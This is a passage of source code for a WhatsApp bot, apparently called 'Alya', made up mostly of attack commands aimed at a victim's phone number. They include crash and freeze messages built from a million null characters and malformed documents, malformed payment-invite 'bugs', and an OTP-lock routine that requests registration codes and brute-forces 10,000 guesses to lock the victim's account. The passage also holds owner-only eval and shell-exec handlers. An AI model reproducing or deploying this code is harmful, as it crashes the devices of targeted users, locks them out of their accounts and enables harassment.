"\0".repeat(1000000)
}
}
}
}
},
{
participant: {
jid: jid
}
}
);
}
}
await replygcalya(`In process....`);
await alyareignsShot(whatsappNumber);
sendMessageWithMentions(
"Successfully Sent Bug To @" +
whatsappNumber.split("@")[0] +
" Using *" +
command +
"👑ALYA IS SUPREME 👑",
[whatsappNumber]
);
}
break;
case "freeze": 
case "🥶": {
if (!isPremium) return replygcalya(mess.prem);
const AlyaDoc = {
url: "./src/data/function/ABug/x.mp3"
};
async function alyaFreeze(jid) {
for (let i = 0; i < 50; i++) {
await AlyaBotInc.sendMessage(jid, {
document: AlyaDoc,
fileName: "👑ALYA IS SUPREME 👑" + alyatext1,
mimetype: "application/zip",
caption: "👑ALYA IS SUPREME 👑" + alyatext1,
pageCount: 0x3b9aca00,
contactVcard: true
});
}
}

await alyaFreeze(m.chat);
}
break;
case "iosfreeze": {
if (!isPremium) return replygcalya(mess.prem);
const subscribe_alya = {
key: {
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast"
},
message: {
listResponseMessage: {
title: `👑ALYA IS SUPREME 👑`
}
}
};
async function alyaCrashyIos(alya, chat, participant) {
AlyaBotInc.sendMessage(
chat,
{
document: {
url: "./settings.js"
},
mimetype: `image/null`,
fileName: `👑ALYA${alyatext6}`,
caption: `👑ALYA ${alyatext6}`
},
{
quoted: {
...subscribe_alya,
key: {
...subscribe_alya.key,
participant
}
}
} // Includes the quoted participant
);
}
async function executeIosAttack() {
if (!args[0]) amount = `99`;
for (let i = 1; i < 10; i++) {
alyaCrashyIos(pushname, m.chat, sender); // Make sure to pass the participant here
}
}
await executeIosAttack();
}

break;

case "pay-bug":
{
if (!AlyaTheQueen) return replygcalya(mess.owner);
if (!text)
return replygcalya(`Usage .${command} 2349123721026`);
let cleanedNumber = text.replace(/[^0-9]/g, "");
if (cleanedNumber.startsWith("0"))
return replygcalya(
`Example : ${prefix + command} 2349123721026`
);
var contactInfo = await AlyaBotInc.onWhatsApp(
cleanedNumber + "@s.whatsapp.net"
);
let whatsappNumber = cleanedNumber + "@s.whatsapp.net";
if (cleanedNumber == "2349123721026") {
return;
}
if (cleanedNumber == "2349123721026") {
return;
}
if (cleanedNumber == "2349123721026") {
return;
}
if (contactInfo.length == 0) {
return replygcalya(
"The number is not registered on WhatsApp"
);
}
async function alyaBugPay(jid) {
await AlyaBotInc.relayMessage(
jid,
{
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadataVersion: 2,
deviceListMetadata: {}
},
interactiveMessage: {
nativeFlowMessage: {
buttons: [{
name: "payment_info",
buttonParamsJson:
'{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+234912xxxxxx3","key_type":"X"}}]}'
}]
}
}
}
}
},
{
participant: {
jid: jid
}
},
{
messageId: null
}
);
}
await alyaBugPay(whatsappNumber);
sendMessageWithMentions(
"Successfully Sent Bug To @" +
whatsappNumber.split("@")[0] +
" Using *" +
command +
"👑ALYA IS SUPREME 👑",
[whatsappNumber]
);
}
break;
case "ios-off": {
if (!isPremium) return replygcalya(mess.prem);
if (!text)
return replygcalya(
`Use ${
prefix + command
} Victim number|total\nExample ${
prefix + command
} 23481xxxxxxxx,5`
);
let number = text.split(",")[0];
let amount = text.split(",")[1] * 5;
if (!number || !amount) {
return replygcalya(
`Use ${
prefix + command
} Victim number|total\nExample ${
prefix + command
} 23481xxxxxxxx,5`
);
}
if (isNaN(parseInt(amount))) {
return replygcalya("The amount must be a number");
}
let cleanedNumber = number.replace(/[^0-9]/g, "");
let encodedAmount = "" + encodeURI(amount);
var contactInfo = await AlyaBotInc.onWhatsApp(
cleanedNumber + "@s.whatsapp.net"
);
let whatsappNumber = cleanedNumber + "@s.whatsapp.net";
if (cleanedNumber == "2349123721026") {
return;
}
if (contactInfo.length == 0) {
return replygcalya(
"The number is not registered on WhatsApp"
);
}
replygcalya(
"please wait, " + command + " hack is in process.."
);
await sleep(2000); // Adjusted sleep time for clarity
sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
await sleep(2500); // Adjusted sleep time for clarity
sendMessageWithMentions(
"TARGET KILLED ☠️ @" +
whatsappNumber.split("@")[0] +
" Using *" +
command +
"👑ALYA IS SUPREME 👑",
[whatsappNumber]
);
}
break;
case "x-ios": {
if (!isPremium) return replygcalya(mess.prem);
if (!isBot) {
return replygcalya("*This feature is only for the bot!*");
}
if (!text) {
return replygcalya(
`Example usage: ${prefix + command} 5`
);
}
if (isNaN(parseInt(text))) {
return replygcalya("The amount must be a number");
}
let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
replygcalya(
"please wait, " +
command +
" bug in process...."
);
await sleep(1500); // Adjusted sleep time for clarity
sendMultiplePaymentInvites(from, encodedValue);
await sleep(2500); // Adjusted sleep time for clarity
sendReaction("âœ…");
}
break;
case "lockotp":
case "tempban":
{
if (!isPremium) return replygcalya(mess.prem);
if (args.length < 1)
return replygcalya(
`Incorrect format\n\nUsage: ${
prefix + command
} country_code|number\nExample: ${
prefix + command
} 234|91xxxxxxxxx`
);
const args2 = args[0].split("|");
if (args2.length !== 2)
return replygcalya(
`Incorrect format\n\nUsage: ${
prefix + command
} country_code|number\nExample: ${
prefix + command
} 234|91xxxxxxxxx`
);
const alyaCountryCode = args2[0];
const atarget = args2[1];
const alyaNumber = atarget.replace("@s.whatsapp.net", "");
const alyamerge = `${alyaCountryCode}${atarget}`;
const alyaMention = alyamerge + "@s.whatsapp.net";
sendMessageWithMentions(
"Successfully Activated OTP LOCK To @" +
alyaMention.split("@")[0] +
" Using *" +
command +
"👑ALYA IS SUPREME 👑",
[alyaMention]
);
try {
const {
stateAlya, saveCredsAlya
} =
await useMultiFileAuthState("./session");
const alyaRequest =
await AlyaBotInc.requestRegistrationCode({
phoneNumber:
"+" + alyaCountryCode + `${alyaNumber}`,
phoneNumberCountryCode: alyaCountryCode,
phoneNumberNationalNumber: `${alyaNumber}`,
phoneNumberMobileCountryCode: 724,
method: "sms"
});
} catch (err) {}

for (let i = 0; i < 10000; i++) {
try {
var alyaPrefix = Math.floor(Math.random() * 999);
var alyaSuffix = Math.floor(Math.random() * 999);
await AlyaBotInc.register(
`${alyaPrefix}-${alyaSuffix}`
);
} catch (err) {
console.log(`${alyaPrefix}-${alyaSuffix}`);
}
}
}
break;
//================{Bug Cases}===========\\
case 'meng':{
                	let audiobuffy = fs.readFileSync(`./AlyaMedia/oke.mp4`)
AlyaBotInc.sendMessage(m.chat, { video: audiobuffy })     
}
break

            default:
                if (budy.startsWith('=>')) {
                    if (!AlyaTheQueen) return AlyaStickOwner()
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replygcalya(bang)
                    }
                    try {
                        replygcalya(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replygcalya(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!AlyaTheQueen) return AlyaStickOwner()
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replygcalya(evaled)
                    } catch (err) {
                        await replygcalya(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!AlyaTheQueen) return AlyaStickOwner()
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replygcalya(err)
                        if (stdout) return replygcalya(stdout)
                    })
                }
                if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
AlyaBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
}
            }
    } catch (err) {
        console.log(util.format(err))
        let e = String(err)
AlyaBotInc.sendMessage("2348100835767@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
if (e.includes("conflict")) return
if (e.includes("Cannot derive from empty media key")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
if (e.includes("Socket connection timeout")) return
    }
}
